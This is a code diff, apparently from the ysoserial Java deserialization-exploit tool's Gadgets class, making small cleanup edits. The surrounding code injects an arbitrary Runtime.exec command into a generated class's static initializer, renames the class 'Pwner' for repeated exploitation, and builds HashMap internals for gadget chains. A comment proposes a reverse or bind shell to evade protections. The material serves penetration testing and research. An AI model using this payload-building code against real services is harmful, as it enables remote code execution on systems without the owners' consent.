@@ -100,7 +100,7 @@ public class Gadgets {
     }
 
     public static Map<String, Object> createMap ( final String key, final Object val ) {
-        final Map<String, Object> map = new HashMap<String, Object>();
+        final Map<String, Object> map = new HashMap<>();
         map.put(key, val);
         return map;
     }
@@ -129,7 +129,7 @@ public class Gadgets {
         pool.insertClassPath(new ClassClassPath(abstTranslet));
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
-        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+        // could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
         clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");   //$NON-NLS-3$ //$NON-NLS-4$
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime()); 
@@ -158,7 +158,7 @@ public class Gadgets {
         try {
             nodeC = Class.forName("java.util.HashMap$Node"); 
         }
-        catch (ClassNotFoundException e ) {
+        catch (@SuppressWarnings("unused") ClassNotFoundException e ) {
             nodeC = Class.forName("java.util.HashMap$Entry"); 
         }
         Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
